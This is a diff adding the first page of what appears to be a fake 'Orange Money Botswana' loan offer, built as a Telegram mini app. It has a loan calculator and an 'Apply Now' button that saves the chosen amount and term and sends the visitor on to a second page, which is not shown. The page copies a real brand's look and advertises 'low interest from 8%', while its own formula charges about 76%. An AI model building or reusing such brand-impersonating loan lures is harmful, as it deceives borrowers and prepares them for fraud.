@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money - Get Your Loan Fast</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #ff7900;
+            --orange-dark: #000000;
+            --orange-hover: #e06a00;
+            --bg-color: #f1f3f5;
+            --card-bg: #ffffff;
+            --text-color: #333333;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: var(--orange-dark);
+            padding: 15px 20px;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            box-sizing: border-box;
+            position: relative;
+            border-bottom: 3px solid var(--orange-primary);
+        }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            margin-right: auto;
+            color: var(--orange-primary);
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        .header-title .orange { color: var(--orange-primary); }
+        .header-title .money { color: #ffffff; margin-left: 5px; }
+
+        /* Card Layout */
+        .card {
+            background: var(--card-bg);
+            width: 92%;
+            max-width: 450px;
+            margin: 20px 0;
+            padding: 25px 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--orange-dark);
+            margin: 0 0 5px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        /* Calculator Inner Area Container */
+        .calculator-container {
+            background: #fafafa;
+            border-radius: 12px;
+            padding: 15px;
+            border: 1px solid #e0e0e0;
+            margin-bottom: 25px;
+        }
+
+        .calculator-title {
+            color: var(--orange-primary);
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .slider-section { margin-bottom: 20px; }
+
+        .slider-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #444;
+            font-weight: 500;
+        }
+
+        .accent-text { color: var(--orange-primary); font-weight: bold; }
+
+        input[type=range] {
+            width: 100%;
+            accent-color: var(--orange-primary);
+            margin: 10px 0;
+            height: 6px;
+            cursor: pointer;
+        }
+
+        .slider-footer {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #888;
+        }
+
+        /* Monthly Payment Results */
+        .result-container {
+            background: white;
+            border: 1px solid #eaeaea;
+            border-radius: 10px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 15px;
+        }
+
+        .result-label {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.2;
+            text-align: left;
+        }
+
+        .result-value-box {
+            text-align: right;
+        }
+
+        .result-currency {
+            color: var(--orange-primary);
+            font-size: 20px;
+            font-weight: bold;
+            display: block;
+            margin: 0;
+        }
+
+        .result-amount {
+            color: var(--orange-primary);
+            font-size: 28px;
+            font-weight: bold;
+            display: block;
+            margin: 0;
+            line-height: 1;
+        }
+
+        /* CTA Button */
+        .btn-apply {
+            background: var(--orange-primary);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            margin-bottom: 25px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-apply:active {
+            background-color: var(--orange-hover);
+        }
+
+        /* Features/Highlights Section */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+            text-align: center;
+        }
+
+        .feature-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .feature-title {
+            font-size: 12px;
+            font-weight: bold;
+            color: var(--orange-dark);
+            margin-bottom: 2px;
+        }
+
+        .feature-desc {
+            font-size: 10px;
+            color: #888;
+            line-height: 1.2;
+        }
+
+        /* Bottom Footer Banner */
+        .footer-banner {
+            width: 100%;
+            background-color: var(--orange-dark);
+            color: rgba(255, 255, 255, 0.8);
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            margin-top: auto;
+            box-sizing: border-box;
+            border-top: 2px solid var(--orange-primary);
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Banner -->
+<div class="app-header">
+    <span class="menu-icon">☰</span>
+    <div class="header-title">
+        <span class="orange">Orange</span><span class="money">Money</span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Get Your Loan Fast</h1>
+    <div class="subtext">Quick approval • Low interest • Easy terms</div>
+
+    <!-- Inside Calculator Box -->
+    <div class="calculator-container">
+        <div class="calculator-title">Loan Calculator</div>
+
+        <!-- Loan Amount Selector -->
+        <div class="slider-section">
+            <div class="slider-header">
+                <span>Loan Amount</span>
+                <span id="valAmt" class="accent-text">P 2,500</span>
+            </div>
+            <input type="range" id="amt" min="100" max="50000" step="50" value="2500">
+            <div class="slider-footer">
+                <span>P 100</span>
+                <span>P 50,000</span>
+            </div>
+        </div>
+
+        <!-- Duration Selector -->
+        <div class="slider-section">
+            <div class="slider-header">
+                <span>Loan Term</span>
+                <span id="valDur" class="accent-text">months 60</span>
+            </div>
+            <input type="range" id="dur" min="6" max="60" step="6" value="60">
+            <div class="slider-footer">
+                <span>months 6</span>
+                <span>months 60</span>
+            </div>
+        </div>
+
+        <!-- Display Area -->
+        <div class="result-container">
+            <div class="result-label">Monthly<br>Payment</div>
+            <div class="result-value-box">
+                <span class="result-currency">P</span>
+                <span id="monthly" class="result-amount">73</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Submit Button going to Page 2 -->
+    <button class="btn-apply" onclick="goToPage2()">APPLY NOW</button>
+
+    <!-- Bottom Features -->
+    <div class="features-grid">
+        <div class="feature-item">
+            <span class="feature-icon">⚡</span>
+            <span class="feature-title">Fast Approval</span>
+            <span class="feature-desc">Within 24 hours</span>
+        </div>
+        <div class="feature-item">
+            <span class="feature-icon">💰</span>
+            <span class="feature-title">Low Interest</span>
+            <span class="feature-desc">Starting from 8%</span>
+        </div>
+        <div class="feature-item">
+            <span class="feature-icon">🔒</span>
+            <span class="feature-title">Secure</span>
+            <span class="feature-desc">Bank-level security</span>
+        </div>
+    </div>
+</div>
+
+<!-- Bottom navigation footer -->
+<div class="footer-banner">
+    © 2026 Orange Money Botswana
+</div>
+
+<script>
+    function update() {
+        const amtEl = document.getElementById('amt');
+        const durEl = document.getElementById('dur');
+
+        if (!amtEl || !durEl) return;
+
+        const amount = Number(amtEl.value) || 0;
+        const duration = Number(durEl.value) || 1;
+
+        // Display formatting using P for Botswana Pula
+        document.getElementById('valAmt').innerText = `P ${amount.toLocaleString()}`;
+        document.getElementById('valDur').innerText = `months ${duration}`;
+
+        // Basic calculation logic: (Amount * Interest multiplier 1.76) / duration
+        const monthly = (amount * 1.76) / duration;
+        
+        // Show calculated monthly output
+        document.getElementById('monthly').innerText = Math.round(monthly).toLocaleString();
+    }
+
+    function goToPage2() {
+        const amtEl = document.getElementById('amt');
+        const durEl = document.getElementById('dur');
+
+        if (!amtEl || !durEl) return;
+
+        localStorage.setItem('amount', "P " + amtEl.value);
+        localStorage.setItem('loanDuration', durEl.value + " Months");
+
+        // Routes to Page 2
+        window.location.href = "/page2";
+    }
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        const amtEl = document.getElementById('amt');
+        const durEl = document.getElementById('dur');
+
+        if (amtEl) amtEl.addEventListener('input', update);
+        if (durEl) durEl.addEventListener('input', update);
+
+        update();
+    };
+</script>
+
+</body>
+</html>
